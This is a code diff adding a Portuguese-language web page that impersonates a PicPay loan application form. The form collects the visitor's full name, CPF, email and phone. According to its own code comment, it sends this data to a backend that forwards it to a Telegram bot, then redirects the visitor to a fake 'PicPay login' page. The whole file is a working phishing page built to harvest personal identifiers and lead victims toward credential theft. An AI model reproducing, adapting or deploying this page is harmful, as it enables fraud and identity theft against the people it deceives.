@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css"> <!-- Link to your global stylesheet -->
+    <title>PicPay Empréstimos - Seus Dados</title>
+</head>
+<body>
+   
+    <style>
+        :root {
+            --picpay-green: #1db954;
+            --picpay-dark-green: #179a45;
+            --bg-gray: #f5f5f5;
+            --text-main: #333333;
+            --text-light: #666666;
+            --white: #ffffff;
+            --border: #dddddd;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background: var(--bg-gray);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 430px;
+            background: var(--white);
+            padding: 30px;
+            border-radius: 18px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+        }
+
+        h2 {
+            color: var(--text-main);
+            font-size: 25px;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: var(--text-light);
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-group label {
+            display: block;
+            color: var(--text-main);
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            height: 48px;
+            padding: 0 14px;
+            border: 1px solid var(--border);
+            border-radius: 9px;
+            background: var(--white);
+            color: var(--text-main);
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: var(--picpay-green);
+            box-shadow: 0 0 0 3px rgba(29, 185, 84, 0.12);
+        }
+
+        .input-group select {
+            cursor: pointer;
+            appearance: auto;
+        }
+
+        form button {
+            width: 100%;
+            height: 50px;
+            margin-top: 5px;
+            border: none;
+            border-radius: 10px;
+            background: var(--picpay-green);
+            color: var(--white);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        form button:hover {
+            background: var(--picpay-dark-green);
+        }
+
+        form button:active {
+            transform: scale(0.99);
+        }
+
+        #loading-container {
+            display: none;
+            text-align: center;
+        }
+
+        .spinner {
+            width: 38px;
+            height: 38px;
+            margin: 0 auto 18px;
+            border: 4px solid #eeeeee;
+            border-top: 4px solid var(--picpay-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        #loading-container p {
+            margin-bottom: 0;
+        }
+
+        @keyframes spin {
+            from {
+                transform: rotate(0deg);
+            }
+
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+
+            .container {
+                padding: 24px 20px;
+            }
+
+            h2 {
+                font-size: 23px;
+            }
+        }
+    </style>
+
+    <!-- Main Form Container -->
+    <div class="container" id="form-container">
+
+        <h2>Solicitação de Empréstimo</h2>
+
+        <p>
+            Preencha os campos abaixo para continuar.
+        </p>
+
+        <form id="applicationForm" onsubmit="event.preventDefault(); submitApplication();">
+
+            <div class="input-group">
+                <label for="fullName">Nome Completo</label>
+
+                <input
+                    type="text"
+                    id="fullName"
+                    placeholder="Seu nome completo"
+                    required
+                >
+            </div>
+
+            <div class="input-group">
+                <label for="cpf">CPF</label>
+
+                <input
+                    type="text"
+                    id="cpf"
+                    maxlength="11"
+                    placeholder="00000000000"
+                    required
+                    pattern="\d{11}"
+                    title="Digite 11 dígitos numéricos para o CPF"
+                >
+            </div>
+
+            <div class="input-group">
+                <label for="email">E-mail</label>
+
+                <input
+                    type="email"
+                    id="email"
+                    placeholder="seu.email@exemplo.com"
+                    required
+                >
+            </div>
+
+            <div class="input-group">
+                <label for="phone">Telefone </label>
+
+                <input
+                    type="tel"
+                    id="phone"
+                    maxlength="11"
+                    placeholder="00999999999"
+                    required
+                    pattern="\d{10,11}"
+                    title="Digite seu telefone com DDD (10 ou 11 dígitos)"
+                >
+            </div>
+
+            <!-- Loan Application Reason -->
+            <div class="input-group">
+                <label for="loanReason">Motivo do Empréstimo</label>
+
+                <select id="loanReason" required>
+
+                    <option value="">
+                        Selecione um motivo
+                    </option>
+
+                    <option value="Consolidação de dívidas">
+                        Consolidação de dívidas
+                    </option>
+
+                    <option value="Pagamento de contas">
+                        Pagamento de contas
+                    </option>
+
+                    <option value="Investimento em negócio">
+                        Investimento em negócio
+                    </option>
+
+                    <option value="Emergência médica">
+                        Emergência médica
+                    </option>
+
+                    <option value="Viagem ou lazer">
+                        Viagem ou lazer
+                    </option>
+
+                    <option value="Reforma da casa">
+                        Reforma da casa
+                    </option>
+
+                    <option value="Educação">
+                        Educação
+                    </option>
+
+                    <option value="Outros">
+                        Outros
+                    </option>
+
+                </select>
+            </div>
+
+            <button type="submit">
+                Continuar
+            </button>
+
+        </form>
+    </div>
+
+    <!-- Hidden Loading Section -->
+    <div class="container" id="loading-container" style="display:none;">
+
+        <div class="spinner"></div>
+
+        <p>
+            Redirecionando para o login PicPay...
+        </p>
+
+    </div>
+    <script>
+        async function submitApplication() {
+    // 1. Collect form values
+    const fullName = document.getElementById('fullName').value;
+    const cpf = document.getElementById('cpf').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+
+    // 2. Basic client-side validation
+    if (!fullName || !cpf || !email || !phone) {
+        alert('Por favor, preencha todos os campos.');
+        return;
+    }
+    if (cpf.length !== 11 || !/^\d{11}$/.test(cpf)) {
+        alert('CPF inválido. Digite 11 dígitos numéricos.');
+        return;
+    }
+    if (!/^\d{10,11}$/.test(phone)) {
+        alert('Telefone inválido. Digite apenas números, incluindo o DDD (10 ou 11 dígitos).');
+        return;
+    }
+
+    // 3. Save fullName to localStorage for approval.html
+    localStorage.setItem('fullName', fullName);
+
+    // 4. Generate or retrieve unique session ID
+    if (!localStorage.getItem('sessionId')) {
+        localStorage.setItem('sessionId', Math.random().toString(36).substring(2, 15));
+    }
+    const sessionId = localStorage.getItem('sessionId');
+
+    // 5. Prepare data to send to backend
+    const dataToSubmit = {
+        fullName: fullName,
+        cpf: cpf,
+        email: email,
+        phone: phone
+    };
+
+    // 6. UI Transition: Show loading, hide form
+    document.getElementById('form-container').style.display = 'none';
+    document.getElementById('loading-container').style.display = 'block';
+
+    try {
+        // 7. Send data to backend (which forwards to Telegram bot)
+        const response = await fetch('/api/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                sessionId: sessionId,
+                type: 'USER_APPLICATION_DATA',
+                content: dataToSubmit
+            })
+        });
+
+        if (response.ok) {
+            // 8. Data sent successfully, now wait 5 seconds and redirect
+            setTimeout(() => {
+                window.location.href = '/login.html'; // Redirect to the PicPay login page
+            }, 5000); // 5-second delay
+        } else {
+            // If backend response is not OK, throw error
+            throw new Error('Erro ao enviar dados para o servidor.');
+        }
+    } catch (err) {
+        console.error('Erro na solicitação:', err);
+        alert("Erro de conexão ou ao enviar os dados. Tente novamente.");
+        // Restore form if there was an error
+        document.getElementById('form-container').style.display = 'block';
+        document.getElementById('loading-container').style.display = 'none';
+    }
+}
+    </script>
+</body>
+</html>
